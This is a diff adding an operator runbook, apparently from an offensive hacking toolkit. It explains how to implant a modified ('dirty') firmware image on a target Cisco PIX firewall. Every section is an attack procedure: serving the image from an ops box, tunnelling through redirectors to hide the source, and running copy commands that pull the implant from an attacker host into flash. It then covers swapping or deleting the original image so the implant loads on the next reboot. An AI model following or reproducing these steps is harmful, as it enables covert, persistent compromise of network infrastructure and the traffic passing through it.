@@ -1,0 +1,160 @@
+#### How to install the new IOS on your target ####
+
+# The Cisco IOS can load images via HTTP/HTTPS or TFTP. Do not use 
+# TFTP, it is very unreliable unless you are close to the target.
+# See teflonhandle/teflondoor for more info.
+# The HTTP will usually work fine. You'll need apache w/ certs
+# for https. For HTTP, tiny httpd works (thttpd), apache works too 
+# but it's not on the ops boxes.  See champ
+# thttpd can be found in the tools directory
+
+## Setup a minimal web server on the linux ops box listening on port 8000.
+
+# Go to the thttpd directory
+cd /current/bin/FW/Tools/thttpd
+
+# Start it listening on port 8000 using your root dir
+/current/bin/FW/Tools/thttpd/thttpd -p 8000 -d /current/bin/FW/Tools/thttpd/httptmp -l /current/bin/FW/Tools/thttpd/http.log
+
+# Copy the new IOS to the web server root on the linux ops box. You need to
+# name the image pix###.bin where ### is the version number like pix634.bin
+cp /mnt/zip/<project>_<ip>_image_bg2111.new /current/bin/FW/Tools/thttpd/httptmp/pix###.bin
+
+# Chmod the file to remove the execute bit, else httpd thinks you have a
+# broken cgi script instead of a binary image.
+chmod -x /current/bin/FW/Tools/thttpd/httptmp/*
+
+## Create the necessary tunnels on the host you are using as a redirector
+# to remotely listen on port 80 and send it back to the linux ops box on
+# port 8000.
+
+## Create the necessary tunnels on the host you are using as a redirector
+# to listen on the linux ops box on port 2300 for a telnet connection or
+# port 2200 for ssh and redirect it to the pix on port 23 (telnet) or
+# port 22 (ssh).
+
+## Connect to the pix with telnet or ssh (be sure to masquerade from a
+# redirector like a pitch or an inside target)
+# If you connect with false.exe you will already be in enable mode.
+
+## Go into enable mode. (you'll likely need a password)
+en
+password
+
+## Run show version to verify the IOS version you want to load matches
+# the currently running IOS. One of the first lines should look similar to this:
+# Cisco PIX Firewall Version 6.2(2)
+show ver
+
+# Check to see the amount of available memory
+show mem
+
+# Show flash to see available flash memory and current files sizes.
+
+sh flash
+
+##### BEFORE YOU PROCEED.. CHECK FOR SAT HOPS! #####
+# Check for a sat hop between your redirector and target pix. If there is a sat
+# hop, you MUST find a different redirector w/o a sat hop!
+#####
+
+
+##### For an IOS 6.x  - for IOS 7.x look to that section below #####
+
+## On IOS 6.x you can only keep one IOS on the pix at a time, so you are going
+# to directly overwrite the currently running IOS. As the pix is uploading the
+# IOS, it checks to make sure it is valid. Once the whole IOS is loaded into
+# memory and passes the checks, it overwrite the IOS on flash.
+
+copy http://IP:port/pix###.bin flash
+
+# Use this if HTTP is unavailable
+# copy tftp://IP:port/pix###.bin flash
+# copy https://IP:port/pix###.bin flash
+
+show flash
+
+exit
+
+# You should be finished after this.  Wait days/weeks/months for the PIX to reboot.
+
+# Kill thttpd
+killall thttpd
+
+##### For an IOS 7.x or newer #####
+# This will display PIX image is currently running and what it will run on boot
+#  The filname listed here will be what you substitute later in
+#  <original_IOS_filename>
+
+sh bootvar
+
+## It will look like this
+# BOOT variable = flash:/image.bin --> obtained at bootup time
+# Current BOOT variable = flash:/image.bin;flash:/image-beta.bin   
+# CONFIG_FILE variable =
+# Current CONFIG_FILE variable =
+
+## If the pix is version 7.0 or greater, you should also look at the flash
+# file system. You want to ensure you copy your image to the flash file system
+# with something similar to the current running image.  Do not overwrite the
+# currently running image during your upload unless you absoluetly have to do
+# so.
+
+## The <new_filename> should be similar to current running filename when running
+# the next command (i.e. images.bin). IP should be the IP of the target box facing
+# the pix.
+
+Over writing the targets image with the dirty image with tftp
+=========================================================================================================
+# This is for overwriting the image. Make sure to verify what the startup and
+# running images are before overwriting.
+sho bootvar
+copy http://IP/pix###.bin flash:/<filename>
+
+# Use this if HTTP is unavailable
+# copy tftp://IP/pix###.bin flash:/<new_filename>
+# copy https://IP/pix###.bin flash:/<new_filename>
+
+
+
+# Our new image should be similar size as the original image (except a few
+# Kb larger). If you take the difference in the size of the file from the
+# show flash before you upgraded and after you upgraded, you should get
+# 32768 Bytes
+
+exit
+# You can not overwrite an image on the PIX 7.x, you have to delete it or
+# rename it to a
+# file that does not exist first.
+
+# You should be finished after this.  Wait days/weeks/months for the PIX to
+# reboot.
+
+# Kill thttpd
+killall thttpd
+
+
+Optional For 7.0 or greater
+===================================================================================================================
+copy http://IP/pix###.bin flash:/<new_filename>
+
+# Use this if HTTP is unavailable
+# copy tftp://IP/pix###.bin flash:/<new_filename>
+# copy https://IP/pix###.bin flash:/<new_filename>
+
+show flash
+
+# Now our new image should be there, you can now run next command
+
+del flash:/<original_IOS_filename>
+
+show flash
+
+# The original image should now be deleted, run next command
+
+rename flash:/<new_filename> flash:/<original_IOS_filename>
+
+sh flash
+================================================================================================================
+
+
